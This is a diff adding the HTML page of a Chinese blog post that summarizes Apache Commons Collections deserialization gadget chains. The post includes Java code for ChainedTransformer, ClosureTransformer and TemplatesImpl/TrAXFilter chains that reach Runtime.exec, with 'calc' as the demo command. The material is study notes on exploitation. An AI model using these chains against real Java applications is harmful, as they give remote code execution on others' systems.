@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            java反序列化小结(1) |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        java反序列化小结(1)
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-06-06 22:50:30</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri Jun 06 2025 22:45:36 GMT+0800">2025-06-06 22:45:36</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.4k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>23 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇文章主要分享一下我个人在学习CC链时对CC链的一些总结和思路，望大佬们进行指正。</p>
+<p>我个人认为cc链可以分为俩个部分，一个是进行命令执行的部分，另一个是触发以及调用命令执行的部分，所以这篇文章就以这俩个部分来进行总结。</p>
+<h1 id="命令执行部分"><a href="#命令执行部分" class="headerlink" title="命令执行部分"></a>命令执行部分</h1><h2 id="ChainedTransformer调用Runtime"><a href="#ChainedTransformer调用Runtime" class="headerlink" title="ChainedTransformer调用Runtime"></a>ChainedTransformer调用Runtime</h2><p>首先就是最经典的<code>ChainedTransformer</code>链式调用<code>Runtime</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于<code>InvokerTransformer</code>的transform方法可以对传入参数进行反射调用与执行，因此可以传入危险函数进行命令执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748766723280-1b03ce81-4228-4709-92ea-3432c98fe0c2.png"></p>
+<p>并且因为Runtime是一个不可序列化的函数(没有实现序列化接口)，因此需要使用反射的方法让其可以序列化，而<code>InvokerTransformer</code>正好能实现这个功能。</p>
+<p><code>InvokerTransformer</code>反射Runtime写法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&#125;).transform(Runtime.class);</span><br><span class="line">Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure>
+
+<p>因为他是一个重复调用的一个过程，因此使用<code>chainedTransformer</code>来进行简化，<code>chainedTransformer</code>的<code>transform</code>方法可以重复调用数组中的<code>transfrom</code>方法，并且作为下一个<code>transfrom</code>方法的参数进行使用。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748767585331-6c18f50f-c596-4660-a4d0-b87bdba9c51f.png"></p>
+<p>而使用<code>ConstantTransformer</code>的原因是因为可以将参数固定在<code>iConstant</code> 中，保证无论调用什么对象都会返回<code>Runtime.class</code>。</p>
+<h3 id="调用-触发"><a href="#调用-触发" class="headerlink" title="调用&amp;触发"></a>调用&amp;触发</h3><p>因此现在需要找到某个可以触发<code>ChainedTransformer#transform</code>方法的函数。</p>
+<h4 id="LazyMap-DefaultedMap-get"><a href="#LazyMap-DefaultedMap-get" class="headerlink" title="[LazyMap&#x2F;DefaultedMap].get()"></a>[LazyMap&#x2F;DefaultedMap].get()</h4><p>在学习CC链的过程中不可或缺的就是LazyMap这个类，其中的get()方法可以触发指定参数的<code>transform</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748846795330-aceaa13d-88f4-4c14-94b8-da017581ae81.png"></p>
+<p>并且有一个和LazyMap这个类十分相似的一个类就是DefaultedMap这个类，他的get方法和LazyMap一样都可以触发指定参数的<code>transform</code>方法，在正常使用的时候直接当成LazyMap进行使用即可。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748847750031-428d45ee-000f-4157-9097-aaa4ea9eb562.png"></p>
+<p>当然，直接触发<code>map#get</code>方法的类其实并不多，在学习CC链的过程中可以发现除了CC1的<code>AnnotationInvocationHandler</code>可以直接触发<code>map#get</code>其他的CC5，CC6，以及CC11其实都借助了一个类<code>TiedMapEntry</code>，通过这个类来触发<code>LazyMap#get()</code>，因此重心主要放到<code>TiedMapEntry</code>这个类中，这个类中的<code>setValue</code>方法可以触发<code>map#get</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748849063285-041d226b-de73-42e5-b6e1-d7eaf17288b4.png"></p>
+<p>而在这个类中又有三个方法可以触发该类的<code>setValue</code>，分别是<code>equals</code>、<code>hashCode</code>、<code>toString</code>这三个方法，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748851693104-34f96860-8f53-4fee-b699-cce896529577.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748851710266-fa825ee4-3539-4eb1-9499-a6711be52e1d.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748851724141-36291e03-f1c7-4205-8032-b789a1b595d2.png"></p>
+<p>因此只要可以触发这三个方法就可以调用<code>Runtime</code>来进行命令执行，当然如果可以直接触发<code>LazyMap#get</code>也是可以的。</p>
+<h4 id="TransformedMap-setValue"><a href="#TransformedMap-setValue" class="headerlink" title="TransformedMap.setValue()"></a>TransformedMap.setValue()</h4><p>除此之外还有<code>TransformedMap#checkSetValue()</code>这一方法也可以触发指定参数的<code>transform</code>，而<code>setValue</code>则是对该方法进行了调用。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748847329906-8fef01f5-0d3c-4f82-878b-b22cffb0215e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748847338904-505596d3-5e0a-4da3-a3a1-8bae7944f90d.png"></p>
+<h4 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare()"></a>TransformingComparator.compare()</h4><p>除了<code>map#put()</code>之外还有<code>org.apache.commons.collections4.comparators.TransformingComparator#compare</code>也可以对任意方法的<code>transform</code>进行调用。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748868507082-6a7cbf89-adfe-4c2c-a3e7-bbdc39042de9.png"></p>
+<p>因此如果存在类可以调用任意<code>compare</code>同样可以调用<code>Runtime</code>进行命令执行。</p>
+<h2 id="ClosureTransformer调用Runtime-无需数组"><a href="#ClosureTransformer调用Runtime-无需数组" class="headerlink" title="ClosureTransformer调用Runtime(无需数组)"></a>ClosureTransformer调用Runtime(无需数组)</h2><p>其实除了<code>ChainedTransformer</code>之外，还有一些方法是可以进行链式调用的，比如这个<code>ClosureTransformer</code>。</p>
+<p>参考文档：<a class="link" target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/CollectionUtils.html">https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/CollectionUtils.html<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Predicate predicate4 = new TransformedPredicate(</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;), null</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Predicate predicate3 = new TransformedPredicate(</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), predicate4</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Predicate predicate2 = new TransformedPredicate(</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[]&#123;&#125;&#125;), predicate3</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Predicate predicate1 = new TransformedPredicate(</span><br><span class="line">        new ConstantTransformer(Runtime.class), predicate2</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Closure closure = new IfClosure(predicate1, null, null);</span><br><span class="line">Transformer transformer = new ClosureTransformer(closure);</span><br></pre></td></tr></table></figure>
+
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>首先可以看到<code>org.apache.commons.collections.functors.TransformedPredicate#evaluate</code>这个方法，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748855714053-7c55c3cf-82e9-49f0-8598-3cf4480a9f24.png"></p>
+<p>可以看到他能调用任意<code>transform()</code>方法，并且作为参数传递给下一个<code>Predicate</code>看到这里是不是很熟悉，和<code>ChainedTransformer#transform</code>方法有点类似。</p>
+<p>再看到<code>org.apache.commons.collections.functors.IfClosure#evaluate</code>方法，他可以调用任意方法的<code>evaluate</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748856018872-d1a93c4a-f39b-46d8-9cb2-17cad73ce368.png"></p>
+<p>现在只需要找到一个<code>transform</code>方法，可以调用<code>evaluate</code>方法即可将其串联起来实现和<code>ChainedTransformer</code>一样的功能，找到<code>org.apache.commons.collections.functors.ClosureTransformer</code>。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748856241638-4933ea0f-74bc-4710-80c6-970098056f08.png"></p>
+<p>他和<code>ChainedTransformer</code>相似，但是又有所不同，由于使用的是<code>Predicate</code>所以其是不受shiro的数组限制的，可以直接在shiro中进行链式调用无需加载字节码。</p>
+<h3 id="调用-触发-1"><a href="#调用-触发-1" class="headerlink" title="调用&amp;触发"></a>调用&amp;触发</h3><p>由于最终还是要调用<code>ClosureTransformer#transfomer</code>，因此触发条件和上面的<code>ChainedTransformer</code>是一样的，只要能调用<code>ChainedTransformer</code>的就可以调用<code>ClosureTransformer#compare</code>。</p>
+<h2 id="TemplateImpl加载字节码"><a href="#TemplateImpl加载字节码" class="headerlink" title="TemplateImpl加载字节码"></a>TemplateImpl加载字节码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">Class tc=templates.getClass();</span><br><span class="line">Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">nameField.setAccessible(true);</span><br><span class="line">nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line">Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">bytecodesField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">tfactoryField.setAccessible(true);</span><br><span class="line">tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>
+
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><code>TemplatesImpl</code>这个类中的字节码是由<code>TransletClassLoader</code>进行加载的，这个类继承了<code>ClassLoader</code>并且重写了<code>defineClass</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748932848099-ae6b8830-982f-4ab0-9ce4-72d3bcd91acf.png"></p>
+<p>重写的<code>defineClass</code>方法变为了<code>default</code>类型，可以被类外部进行调用，这里主要过一下<code>TemplatesImpl</code>的调用链，至于具体是怎么进行加载字节码的，这里就是动态加载字节码的类加载机制的问题了，已经有很多佬们讲解过了，这里就不继续深入讲解了。</p>
+<p>首先是从<code>TransletClassLoader#defineClass()</code>开始寻找谁对他进行了调用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748933629563-18b46b71-d2a9-4639-8a3d-1678a5fea206.png"></p>
+<p>可以找到<code>TemplatesImpl#defineTransletClasses()</code>，但是是<code>private</code>继续寻找</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748934149047-c2d2102f-a3d0-4b31-9fbd-64302299d225.png"></p>
+<p>找到<code>TemplatesImpl#getTransletInstance()</code>，也是<code>private</code>，继续寻找</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748934337466-73c06a61-33d3-442c-9fa6-9e737b315145.png"></p>
+<p>找到<code>TemplatesImpl#newTransformer()</code>这个是一个public方法，因此只需要可以调用这个方法就可以加载字节码了。</p>
+<h3 id="调用-触发-2"><a href="#调用-触发-2" class="headerlink" title="调用&amp;触发"></a>调用&amp;触发</h3><p>这里主要由俩个触发点，一个是由<code>InvokerTransformer</code>来反射他的<code>newTransformer()</code>方法进行调用，另一个是由<code>TrAXFilter#TrAXFilter()</code>方法来触发<code>newTransformer()</code>，当然哈，因为这个类也是不能进行序列化的，所以也需要一些其他的类通过构造函数赋值并实例化。</p>
+<h4 id="InvokerTransformer调用newTransformer"><a href="#InvokerTransformer调用newTransformer" class="headerlink" title="InvokerTransformer调用newTransformer()"></a><code>InvokerTransformer</code>调用<code>newTransformer()</code></h4><p>这里还是通过<code>ChainedTransformer</code>来进行自动传参和链式调用的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">Class tc=templates.getClass();</span><br><span class="line">Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">nameField.setAccessible(true);</span><br><span class="line">nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line">Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">bytecodesField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">tfactoryField.setAccessible(true);</span><br><span class="line">tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(templates),</span><br><span class="line">        new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>当然使用上面的<code>ClosureTransformer</code>进行链式调用也是ok的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;);</span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,codes);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Predicate predicate2 = new TransformedPredicate(</span><br><span class="line">        new InvokerTransformer(&quot;newTransformer&quot;,null,null), null</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Predicate predicate1 = new TransformedPredicate(</span><br><span class="line">        new ConstantTransformer(templates), predicate2</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Closure closure = new IfClosure(predicate1, null, null);</span><br><span class="line">Transformer transformer = new ClosureTransformer(closure);</span><br></pre></td></tr></table></figure>
+
+<p>下面对<code>transform</code>调用和前面的一样就行。</p>
+<h4 id="TrAXFilter-TrAXFilter调用newTransformer"><a href="#TrAXFilter-TrAXFilter调用newTransformer" class="headerlink" title="TrAXFilter#TrAXFilter调用newTransformer()"></a><code>TrAXFilter#TrAXFilter</code>调用<code>newTransformer()</code></h4><p>可以看到图中在进行参数赋值的时候就调用了他的<code>newTransformer()</code>函数。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748959681750-36c57fdf-b18f-460b-94ad-fc524d068a13.png"></p>
+<p>上面说到了<code>TrAXFilter</code>其实是无法进行序列化的，因此这里会使用一些其他的类对其进行调用。</p>
+<h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a><code>InstantiateTransformer</code></h5><p>首先是<code>InstantiateTransformer#transform</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">        new ConstantTransformer(TrAXFilter.class),  </span><br><span class="line">        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749037245793-9b9322a3-cdb6-4c5f-8d32-6a8b4c2d7e05.png"></p>
+<p>这个方法对传入参数进行了实例化的操作。当然，因为他也是<code>transfrom</code>方法，用于自动化传参的方式还是<code>ChainedTransformer</code>，后续调用和之前一样。</p>
+<h5 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a><code>FactoryTransformer</code></h5><p>当然除了<code>InstantiateTransformer#transform</code>之外，还有<code>FactoryTransformer#transform</code>与<code>InstantiateFactory#create</code>相结合也可以做到这一点，并且因为<code>InstantiateFactory</code>的构造函数，使其不需要<code>ChainedTransformer</code>就可以使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InstantiateFactory instantiateFactory=new InstantiateFactory(TrAXFilter.class,new Class[] &#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line">FactoryTransformer factoryTransformer=new FactoryTransformer( instantiateFactory);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>FactoryTransformer#transform</code>调用了一个<code>Factory</code>的create方法</p>
